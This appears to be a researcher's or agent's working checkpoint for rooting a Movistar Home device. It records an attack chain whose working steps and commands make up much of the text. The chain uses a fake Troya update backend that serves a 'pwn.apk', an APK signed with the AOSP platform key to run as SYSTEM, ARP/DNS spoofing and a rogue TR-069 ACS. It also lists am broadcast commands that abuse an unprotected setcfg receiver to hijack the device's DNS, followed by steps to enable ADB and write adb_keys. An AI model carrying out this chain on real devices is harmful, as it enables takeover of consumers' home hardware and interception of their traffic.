# OFF-KERNEL CHAIN — ACS/DNS CHECKPOINT (2026-10-11 21:13)

Primary root path = **off-kernel TR069/Troya**. Everything is built/staged.
**Only blocker: getting the device to resolve `api.es-pro.movistar-home.com` to the Mac (<tester-host>).**

## Where it stands
| Piece | State |
|---|---|
| Fake Troya backend (HTTPS :443, accepts any cert) | **LIVE** — `fake_troya.py`; `GET /api/v1/updates/sw` → `{"hasUpdate":true,"url":.../bundle.json}`; `/bundle.json` → `BundleApp{apps:[{apk,package,signature,version_code}]}`; serves `/pwn.apk` when present. Verified. |
| Platform signing key (AOSP test) | **OBTAINED** — `keys/platform.*`, `keys/platform.*`, subject `CN=Android`. Tooling: `javac`, `d8`, `apktool` present (no aapt/apksigner). |
| Silent-install sink | **IDENTIFIED** — updater `com.telefonica.movistarhome.updater` (SYSTEM, INSTALL_PACKAGES), unprotected dynamic receiver `ACTION_UPDATE_APPS` → `installCandidates` → `PackageManager.installPackage` (`AndroidComponent.silentInstallPackage`). |
| Device DNS → Mac | **BLOCKED** ← the only missing link |
| Full device TR069 config (creds, URLs, LAN) | **CAPTURED** (see below) |
| ACS-driven LAN/DNS `SetParameterValues` | **PATCHED + VERIFIED** server-side (`fake_acs.py`). Device does not honour ConnectionRequest-triggered session. |
| `Device.LAN` apply broadcast from Termux | **NO RECEIVER** (`am broadcast … result=0`) |

## Device TR069 config (from getcfg, `uploads/upload-20261011-210042-693666.bin`)
- `Device.ManagementServer.URL = http://<tester-host>:7014/cwmpWeb/WGCPEMgt`  ← already the Mac (set via app `testurl`)
- `Device.CWMP.HttpsAcsUrl = https://main.acs.telefonica.net:7014/cwmpWeb/WGCPEMgt` (pf-redirected to Mac:7016)
- `ConnectionRequestURL = http://<device-ip>:7547` — CR user `<redacted-cr-user>`, CR pass `<redacted-cr-password>`
- `Device.LAN.{AddressingType=DHCP, IPAddress=<device-ip>, SubnetMask=255.255.255.0, DefaultGateway=<gateway>, DNSServers=<tester-host>}`
  → **DNSServers already = Mac, but AddressingType=DHCP makes the app ignore it** (`SetAcsDeviceLan.applyLanSettingsToDevice`: dhcp ⇒ DNS cleared; only `static` uses DNS).
- SSID `<ssid>`, device MAC `<device-mac>`, FW `ES_g1.0_RG3205W3.7.0`.

## Why DNS is still wrong (evidence)
- Device `ping api.es-pro.movistar-home.com` → `unknown host`; `main.acs.telefonica.net` → real `<acs-ip-2>`.
- `arp_dns_spoof.py` **restarted with `movistar-home.com` in `HIJACK_SUFFIXES`** (mitm.log confirms) yet **no `*** HIJACKING` / `passthrough` lines ever appear** ⇒ the device's DNS queries never traverse the spoofed gateway path (its ARP cache still points at the real router; the spoofer only answers when the device re-ARPs). Fresh names under both `movistar-home.com` and `telefonica.net` also fail ⇒ not an NXDOMAIN cache issue.
- ACS `ConnectionRequest` to `http://<device-ip>:7547/` returns **200**, but **no device Inform** reaches the ACS → can't push `SetParameterValues` that way.
- `am broadcast -a askey.tr069.intent.action.Device.LAN --es addr_type static --es dns_server <tester-host> …` → `Broadcast completed: result=0` (no receiver for an untrusted_app sender).

## Ready-to-go `SetParameterValues` (server side proven)
`fake_acs.py` now emits, on the ACS hold (empty POST):
```xml
<cwmp:SetParameterValues><ParameterList arrayType="cwmp:ParameterValueStruct[5]">
  Device.LAN.AddressingType=static, IPAddress=<device-ip>, SubnetMask=255.255.255.0,
  DefaultGateway=<gateway>, DNSServers=<tester-host></ParameterList><ParameterKey>mh1337dnsset</ParameterKey>
</cwmp:SetParameterValues>
```
`SetAcsDeviceLan` special-cases `Device.LAN.DNSServers` as writable → `applyLanSettingsToDevice` broadcasts `askey.tr069.intent.action.Device.LAN` (dns_server) → Wi-Fi monitor applies. This is the intended, in-app way to switch the device's resolver.

## Remaining options (pick one)
1. **Router/DHCP**: set LAN DNS = `<tester-host>` on the router; device renews lease → my dnsmasq answers `movistar-home.com`. Simplest, no device access needed.
2. **Force re-ARP** so the spoofer catches DNS: cause the device to re-ARP for the gateway (e.g., bring wlan0 down/up, or wait for ARP timeout). Or run the spoof with the device's ARP entry cleared.
3. **ACS push**: get the device to run a CWMP session so our (already-patched) ACS delivers the `SetParameterValues`. The device's CR server answered 200 but didn't Inform — verify CR path/creds, or trigger `Device.CWMP.Bootstrap`/periodic Inform.
4. (Fallback) keep CVE-2021-1905 / af_unix-0920 kernel paths; SYSTEM from the silent-install still gives broader kernel surface than untrusted_app.

## Downstream (unchanged, ready)
Build APK `sharedUserId="android.uid.system"` signed with `keys/platform.*` → `troya/pwn.apk` → backend serves it as the BundleApp app. Trigger the updater's `ACTION_UPDATE_APPS` → `silentInstallPackage` → our app runs as **SYSTEM**. Then flip `DEVELOPMENT_SETTINGS_ENABLED`/`ADB_ENABLED`, write `/data/misc/adb/adb_keys`, `adb connect`, → root. (No OTA / no hardware / no testkey-boot flash — red lines respected.)

## Device setup notes
- Upload server `:8010` (launchd `com.movistarhome.uploadserv`); poller restarts after reboot:
  `pkill -9 -f poller.sh; pkill -9 -f 'poc-'; setsid nohup bash ~/poller.sh > ~/poller.log 2>&1 &`
- fake_acs on **:7014 + :7016** (`fake_acs.py`, patched); acs_http on :8020. fake_troya on :443.

---

## UPDATE 21:22 — DNS HIJACK ACHIEVED (device → Mac) ✅

**The working primitive (from Termux / untrusted_app, no ACS, no router):**
```
# 1) write LAN keys into the SYSTEM TR069 config
am broadcast -a askey.tr069.intent.action.setcfg --es keyName Device.LAN.AddressingType --es keyValue static
am broadcast -a askey.tr069.intent.action.setcfg --es keyName Device.LAN.IPAddress     --es keyValue <device-ip>
am broadcast -a askey.tr069.intent.action.setcfg --es keyName Device.LAN.SubnetMask    --es keyValue 255.255.255.0
am broadcast -a askey.tr069.intent.action.setcfg --es keyName Device.LAN.DefaultGateway --es keyValue <gateway>
am broadcast -a askey.tr069.intent.action.setcfg --es keyName Device.LAN.DNSServers    --es keyValue <tester-host>
# 2) apply (app re-broadcasts internally as SYSTEM)
am broadcast -a askey.tr069.intent.action.Device.LAN --es addr_type static \
  --es ip_address <device-ip> --es sub_mask 255.255.255.0 \
  --es default_gateway <gateway> --es dns_server <tester-host>
```
Result: device `ping api.es-pro.movistar-home.com` → **<tester-host>** (Mac). JOB-126.
`setcfg` is reachable from an untrusted sender (Receiver.java:69 skips the perm check for setcfg/aspsh/dhcpOption/ntpServer/timezone/thermalsts).

**Device reached the fake backend over HTTPS** (TLS accept-any): device `curl https://api.es-pro.movistar-home.com/api/v1/updates/sw` returned our JSON; backend log shows the device's `GET /api/v1/updates/sw`. JOB-127.

## Remaining: trigger the updater app-update flow
- Action: `com.telefonica.movistarhome.updater.data.action.ACTION_UPDATE_APPS` (from `Actions.java`).
- Receiver `UpdaterOperationsProxy` is **dynamic** (registered at app start) → `am broadcast` alone gives `result=0` if the app isn't running.
- Updater manifest (`troya/up/AndroidManifest.xml`): `sharedUserId="android.uid.system"`, **exported service `com.telefonica.movistarhome.updater.data.PackageService`**, activity `…view.sw.UpdateSwActivity` (not exported). `startservice` of PackageService didn't visibly spawn the process (JOB-128).
- Next: ensure the app process runs (start `PackageService`, or start the `UpdateSwActivity` via its exported/cmp route, or fire the alarm PendingIntent `UpdateAlarmManager`), then broadcast ACTION_UPDATE_APPS; watch `troya_backend.log` for `/bundle.json` + `/pwn.apk`.
- Then: build `troya/pwn.apk` (sharedUserId=android.uid.system, signed with `keys/platform.*` via PKCS12+jarsigner; no aapt/apksigner — use apktool to repack an existing system APK) → backend serves it → `silentInstallPackage` → SYSTEM → root.
